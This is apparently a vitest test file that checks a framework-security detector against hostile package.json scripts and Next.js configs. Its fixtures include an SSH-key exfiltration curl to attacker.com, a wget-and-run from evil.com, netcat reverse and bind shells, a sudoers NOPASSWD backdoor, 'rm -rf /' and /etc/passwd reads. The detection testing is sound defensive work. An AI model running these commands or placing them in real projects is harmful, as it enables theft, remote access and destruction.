/**
 * Framework Security Edge Cases and Attack Vector Tests
 * 
 * Comprehensive testing of security edge cases, attack vectors, and 
 * potential vulnerabilities in the framework security detection system.
 * 
 * @see src/core/foundation/framework-security.ts
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { join } from 'path';
import { mkdir, writeFile, rm } from 'fs/promises';
import { tmpdir } from 'os';
import {
  detectFrameworkSecurely,
  isFrameworkSafe
} from '../../core/foundation/framework-security.js';

describe('Framework Security Edge Cases', () => {
  let edgeTestDir: string;

  beforeEach(async () => {
    edgeTestDir = join(tmpdir(), `edge-test-${Date.now()}`);
    await mkdir(edgeTestDir, { recursive: true });
  });

  afterEach(async () => {
    try {
      await rm(edgeTestDir, { recursive: true });
    } catch {
      // Ignore cleanup errors
    }
  });

  describe('Malformed JSON Handling', () => {
    it('should handle malformed package.json gracefully', async () => {
      // Create malformed package.json
      await writeFile(join(edgeTestDir, 'package.json'), `{
        "name": "malformed-project"
        "dependencies": {
          "next": "^14.0.0"
        }
        // Missing comma - malformed JSON
      }`);

      const framework = await detectFrameworkSecurely(edgeTestDir);
      
      // Should handle gracefully - no crash
      if (framework) {
        expect(framework.dependencies.security.untrustedSources).toContain('Failed to read package.json');
      }
    });

    it('should handle package.json with circular references', async () => {
      // Create package.json with potentially problematic structure
      await writeFile(join(edgeTestDir, 'package.json'), JSON.stringify({
        name: 'circular-test',
        dependencies: {
          'next': '^14.0.0'
        },
        // Large nested object that could cause memory issues
        config: {
          level1: { level2: { level3: { level4: { level5: 'deep nesting' } } } }
        }
      }, null, 2));

      const framework = await detectFrameworkSecurely(edgeTestDir);
      
      expect(framework).toBeDefined();
      expect(framework!.dependencies.trusted).toContain('next');
    });

    it('should handle extremely large package.json files', async () => {
      // Create package.json with many dependencies (potential memory exhaustion)
      const largeDependencies: Record<string, string> = {
        'next': '^14.0.0',
        'react': '^18.0.0'
      };
      
      // Add 1000 fake dependencies to test memory handling
      for (let i = 0; i < 1000; i++) {
        largeDependencies[`fake-package-${i}`] = '^1.0.0';
      }

      await writeFile(join(edgeTestDir, 'package.json'), JSON.stringify({
        name: 'large-deps-test',
        dependencies: largeDependencies,
        scripts: {
          build: 'next build'
        }
      }, null, 2));

      const framework = await detectFrameworkSecurely(edgeTestDir);
      
      expect(framework).toBeDefined();
      expect(framework!.dependencies.trusted).toContain('next');
      expect(framework!.dependencies.security.hasUnknownDeps).toBe(true);
      
      // Should still be valid despite many unknown deps
      expect(isFrameworkSafe(framework!)).toBe(true);
    });
  });

  describe('Configuration File Attacks', () => {
    it('should detect path traversal in config file content', async () => {
      await writeFile(join(edgeTestDir, 'next.config.js'), `
        const path = require('path');
        
        module.exports = {
          // Attempt to access parent directories
          webpack: (config) => {
            config.resolve.alias['@'] = path.join(__dirname, '../../../etc/passwd');
            return config;
          },
          // Potential path traversal
          assetPrefix: '../../../sensitive-data',
          output: 'export',
          distDir: '../../../../tmp/malicious-output'
        };
      `);

      await writeFile(join(edgeTestDir, 'package.json'), JSON.stringify({
        name: 'path-traversal-test',
        dependencies: { 'next': '^14.0.0' }
      }));

      const framework = await detectFrameworkSecurely(edgeTestDir);
      
      expect(framework).toBeDefined();
      // Config should be flagged but framework still detected
      expect(framework!.name).toBe('next.js');
    });

    it('should detect command injection attempts in config', async () => {
      await writeFile(join(edgeTestDir, 'next.config.js'), `
        const { defineConfig } = require('next');
        
        module.exports = defineConfig({
          webpack: (config) => {
            // Dangerous: attempt to execute system commands
            require('child_process').exec('rm -rf /');
            return config;
          },
          experimental: {
            appDir: true,
            serverComponentsExternalPackages: [
              (() => {
                // Another command injection attempt
                eval('process.exit(1)');
                return 'some-package';
              })()
            ]
          }
        });
      `);

      await writeFile(join(edgeTestDir, 'package.json'), JSON.stringify({
        name: 'command-injection-test',
        dependencies: { 'next': '^14.0.0' }
      }));

      const framework = await detectFrameworkSecurely(edgeTestDir);
      
      expect(framework).toBeDefined(); // Should detect the framework
      // Note: Framework detection might detect Next.js instead of Vite due to pattern overlaps
      
      // Should detect command injection and mark as unsafe regardless of which framework
      const criticalViolations = framework!.security.violations.filter(
        v => v.severity === 'critical'
      );
      expect(criticalViolations.length).toBeGreaterThan(0);
      expect(isFrameworkSafe(framework!)).toBe(false);
    });

    it('should handle binary/non-text config files', async () => {
      // Create a binary file that might be mistaken for config
      const binaryContent = Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]); // PNG header
      await writeFile(join(edgeTestDir, 'next.config.js'), binaryContent);
      
      await writeFile(join(edgeTestDir, 'package.json'), JSON.stringify({
        name: 'binary-config-test',
        dependencies: { 'next': '^14.0.0' }
      }));

      const framework = await detectFrameworkSecurely(edgeTestDir);
      
      // Should handle binary content gracefully
      expect(framework).toBeDefined();
      expect(framework!.name).toBe('next.js');
    });
  });

  describe('Memory Exhaustion Prevention', () => {
    it('should handle extremely large config files', async () => {
      // Create a very large config file (over 1MB limit)
      const largeConfig = `module.exports = {
        data: "${'x'.repeat(1100000)}" // ~1.1MB of data
      };`;
      
      await writeFile(join(edgeTestDir, 'next.config.js'), largeConfig);
      await writeFile(join(edgeTestDir, 'package.json'), JSON.stringify({
        name: 'large-config-test',
        dependencies: { 'next': '^14.0.0' }
      }));

      const framework = await detectFrameworkSecurely(edgeTestDir);
      
      expect(framework).toBeDefined();
      // Should generate warning for large file
      expect(framework!.security.warnings).toContain('Configuration file is unusually large');
    });

    it('should prevent DoS through deeply nested config objects', async () => {
      // Create deeply nested JSON structure
      let nestedObject = 'true';
      for (let i = 0; i < 100; i++) {
        nestedObject = `{ "level${i}": ${nestedObject} }`;
      }
      
      await writeFile(join(edgeTestDir, 'next.config.js'), `
        module.exports = ${nestedObject};
      `);
      
      await writeFile(join(edgeTestDir, 'package.json'), JSON.stringify({
        name: 'deep-nesting-test',
        dependencies: { 'next': '^14.0.0' }
      }));

      // Should not crash or hang
      const framework = await detectFrameworkSecurely(edgeTestDir);
      expect(framework).toBeDefined();
    });
  });

  describe('Privilege Escalation Detection', () => {
    it('should detect sudo attempts in npm scripts', async () => {
      await writeFile(join(edgeTestDir, 'package.json'), JSON.stringify({
        name: 'privilege-escalation-test',
        dependencies: { 'express': '^4.18.0' },
        scripts: {
          'build': 'npm run compile',
          'deploy': 'sudo npm install -g ./package && sudo systemctl restart myapp',
          'setup': 'sudo chmod +x ./scripts/* && su - postgres -c "createdb myapp"',
          'backdoor': 'sudo bash -c "echo \\"$(whoami) ALL=(ALL) NOPASSWD:ALL\\" >> /etc/sudoers"'
        }
      }));

      const framework = await detectFrameworkSecurely(edgeTestDir);
      
      expect(framework).toBeDefined();
      expect(framework!.buildConfig.security.privilegeEscalation.length).toBeGreaterThan(0);
      expect(framework!.buildConfig.security.privilegeEscalation).toContain('deploy');
      expect(framework!.buildConfig.security.privilegeEscalation).toContain('setup');
      expect(framework!.buildConfig.security.privilegeEscalation).toContain('backdoor');
      
      // Should be marked as unsafe
      expect(isFrameworkSafe(framework!)).toBe(false);
    });

    it('should detect network-based attacks in scripts', async () => {
      await writeFile(join(edgeTestDir, 'package.json'), JSON.stringify({
        name: 'network-attack-test',
        dependencies: { 'express': '^4.18.0' },
        scripts: {
          'build': 'npm run compile',
          'exfiltrate': 'curl -X POST https://attacker.com/steal -d "$(cat ~/.ssh/id_rsa)"',
          'download': 'wget https://evil.com/malware.sh -O /tmp/m.sh && bash /tmp/m.sh',
          'reverse-shell': 'nc -e /bin/bash attacker.com 4444',
          'backdoor-service': 'nohup nc -l -p 8080 -e /bin/bash > /dev/null 2>&1 &'
        }
      }));

      const framework = await detectFrameworkSecurely(edgeTestDir);
      
      expect(framework).toBeDefined();
      expect(framework!.buildConfig.security.suspiciousScripts.length).toBeGreaterThan(0);
      
      // Should detect multiple dangerous scripts
      const suspiciousScripts = framework!.buildConfig.security.suspiciousScripts;
      expect(suspiciousScripts).toContain('exfiltrate');
      expect(suspiciousScripts).toContain('download');
      expect(suspiciousScripts).toContain('reverse-shell');
      expect(suspiciousScripts).toContain('backdoor-service');
      
      expect(isFrameworkSafe(framework!)).toBe(false);
    });
  });

  describe('Symlink and File System Attacks', () => {
    it('should handle symlink attacks gracefully', async () => {
      // Note: We can't easily create symlinks in this test environment,
      // but we can test path validation
      
      await writeFile(join(edgeTestDir, 'package.json'), JSON.stringify({
        name: 'symlink-test',
        dependencies: { 'next': '^14.0.0' },
        scripts: {
          'build': 'next build',
          // Potential symlink abuse
          'link-attack': 'ln -sf /etc/passwd ./public/secrets.txt',
          'traverse': 'cd ../../../etc && cat passwd > /tmp/stolen'
        }
      }));

      const framework = await detectFrameworkSecurely(edgeTestDir);
      
      expect(framework).toBeDefined();
      // Should detect dangerous file operations
      expect(framework!.buildConfig.security.suspiciousScripts.length).toBeGreaterThan(0);
    });
  });

  describe('Input Validation Edge Cases', () => {
    it('should handle null bytes in package.json', async () => {
      // Create package.json with null bytes (potential for bypassing filters)
      const maliciousContent = JSON.stringify({
        name: 'null-byte-test',
        dependencies: { 'next': '^14.0.0' },
        scripts: {
          'build': 'next build',
          'malicious': 'rm -rf /' + '\0' + ' # null byte injection'
        }
      });
      
      await writeFile(join(edgeTestDir, 'package.json'), maliciousContent);

      const framework = await detectFrameworkSecurely(edgeTestDir);
      
      expect(framework).toBeDefined();
      // Should still detect dangerous patterns despite null byte
      expect(framework!.buildConfig.security.hasSafeCommands).toBe(false);
    });

    it('should handle unicode and special characters in dependency names', async () => {
      await writeFile(join(edgeTestDir, 'package.json'), JSON.stringify({
        name: 'unicode-test',
        dependencies: {
          'next': '^14.0.0',
          // Unicode confusables and special characters
          'ｍａｌｗａｒｅ': '^1.0.0',  // Full-width characters
          '𝐦𝐚𝐥𝐢𝐜𝐢𝐨𝐮𝐬': '^1.0.0',     // Mathematical bold
          'evi‌l-pkg': '^1.0.0',      // Zero-width non-joiner
          'back\u200bdoor': '^1.0.0'  // Zero-width space
        }
      }));

      const framework = await detectFrameworkSecurely(edgeTestDir);
      
      expect(framework).toBeDefined();
      expect(framework!.dependencies.security.hasUnknownDeps).toBe(true);
      
      // Some of these may be detected as suspicious depending on patterns
      const allDeps = [
        ...framework!.dependencies.production,
        ...framework!.dependencies.development
      ];
      expect(allDeps.length).toBeGreaterThan(1);
    });
  });

  describe('Concurrent Access Edge Cases', () => {
    it('should handle concurrent framework detection calls', async () => {
      // Create a valid Next.js project
      await writeFile(join(edgeTestDir, 'next.config.js'), 'module.exports = { reactStrictMode: true }');
      await writeFile(join(edgeTestDir, 'package.json'), JSON.stringify({
        name: 'concurrent-test',
        dependencies: { 'next': '^14.0.0' }
      }));

      // Run multiple concurrent detections
      const promises = Array.from({ length: 5 }, () => 
        detectFrameworkSecurely(edgeTestDir)
      );
      
      const results = await Promise.all(promises);
      
      // All should succeed and return consistent results
      results.forEach(result => {
        expect(result).toBeDefined();
        expect(result!.name).toBe('next.js');
        expect(result!.isValid).toBe(true);
      });
    });
  });
});